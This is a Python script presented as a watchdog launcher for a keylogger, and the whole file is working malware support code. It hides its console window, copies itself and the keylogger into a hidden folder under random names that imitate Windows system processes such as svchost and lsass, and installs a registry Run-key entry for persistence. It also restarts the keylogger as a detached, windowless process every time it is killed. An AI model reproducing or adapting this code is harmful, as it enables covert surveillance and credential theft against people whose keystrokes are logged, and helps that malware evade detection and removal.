#!/usr/bin/env python3
"""
Watchdog Launcher - Ensures keylogger always runs
Automatically restarts if process is killed
Changes executable name randomly on each restart
"""

import os
import sys
import time
import random
import string
import subprocess
import shutil
from pathlib import Path

# Hide console window immediately
if sys.platform == 'win32':
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Configuration
MAIN_EXECUTABLE = "keylogger_windows_advanced.py"  # Will be replaced by builder
MAX_RESTARTS = 999999  # Essentially infinite
RESTART_DELAY = 5  # Seconds before restarting

# Common Windows process names for disguise
COMMON_NAMES = [
    "svchost", "csrss", "smss", "lsass", "winlogon", "services", "spoolsv",
    "explorer", "taskhost", "dwm", "conhost", "RuntimeBroker", "SearchApp",
    "SystemSettings", "WindowsUpdate", "SecurityHealthService", "MsMpEng",
    "audiodg", "wininit", "fontdrvhost", "sihost", "taskhostw"
]


def generate_random_name():
    """Generate a random process name that looks legitimate"""
    if random.choice([True, False]):
        # Use common Windows process name
        base = random.choice(COMMON_NAMES)
        # Sometimes add numbers like real Windows processes
        if random.random() < 0.3:
            base += str(random.randint(1, 99))
    else:
        # Generate random legitimate-looking name
        prefixes = ["System", "Windows", "Microsoft", "Service", "Runtime", "Host", "Update"]
        suffixes = ["Service", "Host", "Manager", "Helper", "Handler", "Process"]
        base = random.choice(prefixes) + random.choice(suffixes)

    return base


def copy_with_random_name(source, target_dir):
    """Copy executable with random name"""
    # Generate random name
    random_name = generate_random_name()
    extension = ".exe" if source.endswith(".exe") else ".py"

    # Create target path
    target = target_dir / f"{random_name}{extension}"

    # Copy file
    shutil.copy2(source, target)

    # On Windows, hide the file
    if sys.platform == 'win32':
        try:
            os.system(f'attrib +h "{target}"')
        except:
            pass

    return target


def get_hidden_directory():
    """Get or create hidden directory for copies"""
    if sys.platform == 'win32':
        hidden_dir = Path(os.path.expandvars(r'%APPDATA%\SystemData'))
    else:
        hidden_dir = Path.home() / ".config" / ".system"

    hidden_dir.mkdir(parents=True, exist_ok=True)

    # Hide directory on Windows
    if sys.platform == 'win32':
        try:
            os.system(f'attrib +h "{hidden_dir}"')
        except:
            pass

    return hidden_dir


def install_persistence(executable_path):
    """Install persistence with current executable"""
    try:
        if sys.platform == 'win32':
            # Registry Run Key
            import winreg

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )

            # Use a system-sounding name
            entry_name = generate_random_name()
            winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, str(executable_path))
            winreg.CloseKey(key)

            return True
        else:
            # Linux systemd or crontab
            # (Simplified for now)
            return False
    except:
        return False


def start_main_process(executable_path):
    """Start the main keylogger process"""
    try:
        if sys.platform == 'win32':
            # Start detached on Windows
            process = subprocess.Popen(
                [sys.executable, str(executable_path)],
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            # Start detached on Linux
            process = subprocess.Popen(
                [sys.executable, str(executable_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp
            )

        return process
    except Exception as e:
        return None


def main():
    """Main watchdog loop"""
    restart_count = 0
    hidden_dir = get_hidden_directory()

    # Get the main executable path
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        main_exe = Path(sys.executable).parent / MAIN_EXECUTABLE
    else:
        # Running as script
        main_exe = Path(__file__).parent / MAIN_EXECUTABLE

    # First run: install persistence with watchdog itself
    if restart_count == 0:
        watchdog_copy = copy_with_random_name(sys.argv[0], hidden_dir)
        install_persistence(watchdog_copy)

    while restart_count < MAX_RESTARTS:
        try:
            # Copy main executable with random name
            random_copy = copy_with_random_name(main_exe, hidden_dir)

            # Start the main process
            process = start_main_process(random_copy)

            if process is None:
                time.sleep(RESTART_DELAY)
                restart_count += 1
                continue

            # Monitor the process
            while True:
                exit_code = process.poll()

                if exit_code is not None:
                    # Process died, restart it
                    restart_count += 1

                    # Clean up old copy
                    try:
                        random_copy.unlink()
                    except:
                        pass

                    # Wait before restart
                    time.sleep(RESTART_DELAY)
                    break

                # Check every second
                time.sleep(1)

        except KeyboardInterrupt:
            # User intentionally stopped
            break
        except Exception as e:
            # Error occurred, wait and retry
            time.sleep(RESTART_DELAY)
            restart_count += 1


if __name__ == "__main__":
    main()
